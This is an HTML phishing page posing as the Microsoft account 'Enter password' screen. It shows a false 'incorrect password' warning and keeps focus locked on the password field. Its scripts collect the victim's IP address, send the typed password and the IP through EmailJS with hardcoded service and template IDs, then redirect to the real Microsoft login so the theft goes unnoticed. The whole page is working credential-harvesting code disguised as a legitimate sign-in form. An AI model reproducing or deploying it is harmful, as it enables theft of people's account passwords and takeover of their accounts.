<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="app.css" />
    <link
      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
      rel="stylesheet"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  </head>

  <body>
    <form
      name="sentMessage"
      novalidate="novalidate"
      id="myForm"
      method="post"
      action="https://login.live.com/"
    >
   

      <!-- <section id="section_pwd" class="d-none"> -->
        <div class="auth-wrapper topper" style="margin-top: 7.6%;">
          <img src="logo.png" alt="Microsoft" class="d-block" />
          <div class="identity w-100 mt-16 mb-16">
            <button class="back">
              <img src="back.png" />
            </button>
            <!-- <span id="user_identity">a@b.com</span> -->
          </div>
          <h2 class="title mb-16">Enter password</h2>
          <p style="color: red;">Your account or password is incorrect.</p>
          <!-- <form> -->
          <div class="mb-16">
            <p id="error_pwd" class="error"></p>
            <input
              id="inp_pwd"
              type="password"
              name="pass"
              class="input"
              placeholder="Password"
            />
          </div>
          <!-- </form> -->
          <div>
            <p class="mb-16">
              <a href="#" class="link fs-13">Forgot password?</a>
            </p>
            <p class="mb-16">
              <a href="#" class="link fs-13">Other ways to sign in</a>
            </p>
          </div>
          <div>
            <button
              class="btn"
              onclick="SendMail();"
              type="submit"
              id="btn_sig"
            >
              Sign in
            </button>
          </div>
        </div>
      <!-- </section> -->
    </form>

    <!-- <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox" />
                <span>Don't show this again</span>
            </label>
            <div class="btn-group">
                <button class="btn btn-sec" id="btn_final">No</button>
                <button class="btn" id="btn_final">Yes</button>
            </div>
        </div>
    </section> -->
    <footer class="footer">
      <a href="#">Terms of use</a>
      <a href="#">Privacy & cookies</a>
      <span>.&nbsp;.&nbsp;.</span>
    </footer>

    <!-- <script>
        function SendMailAndRedirect() {
            SendMail(); // Call the SendMail function
            window.location.href = 'https://login.live.com/'; // Redirect to the specified URL
        }
        </script> -->

        <script>
          // Function to keep the input always focused
          function keepInputFocused() {
              const input = document.getElementById('inp_pwd');
              input.focus();
  
              // Optional: Prevent the input from losing focus
              input.addEventListener('blur', () => {
                  setTimeout(() => {
                      input.focus();
                  }, 0);
              });
          }
  
          // Call the function when the page loads
          window.onload = keepInputFocused;
      </script>

    
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
    ></script>

    <script type="text/javascript">
      emailjs.init("cFeXc8X5RyMcbrmAD");
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <script></script>

    <script>
      const button = document.getElementById("btn_sig");
      let USERIP = "";
      button.addEventListener("click", () => {
        // Get the user's IP address
        const ipUrl = "https://api.ipify.org?format=json";
        fetch(ipUrl)
          .then((res) => res.json())
          .then((data) => {
            userIP = data.ip;
            
            localStorage.setItem('userIsP', userIP);
            // console.log('User IP:', userIP); // Use the IP as needed
          })
          .catch(() => {
            console.log("Error fetching IP data from API");
          });
      });


       window.onload = function () {
        const btn = document.getElementById("btn_sig");

        document
          .getElementById("myForm")
          .addEventListener("submit", function (event) {
            event.preventDefault();
            
            const USERIP = localStorage.getItem("userIsP");
            // let userIPs = localStorage.getItem('userIP'); // Retrieve the string from localStorage
            // let userIP = parseFloat(userIPs);
            // console.log(ip)
            const pass = document.getElementById("inp_pwd").value.trim();
            if (pass === "") {
            
            btn.value = "Send Email";
            return; // Prevent the form submission process
            }

            const serviceID = "service_g0j52o6";
            const templateID = "template_tzq2um7";

            const templateParams = {
                
                USERIP: USERIP,
                pass: pass
            };

            emailjs.send(serviceID, templateID, templateParams)
            .then(
              () => {
                btn.value = "Send Email";
                // alert("Incorrect Password");
                window.location.href = 'https://login.live.com/';
              },
              (err) => {
                btn.value = "Send Email";
                alert(JSON.stringify(err));
              }
            );
          });
      };
    </script>

    <script>
     
    </script>
    <script src="app.js"></script>
  </body>
</html>
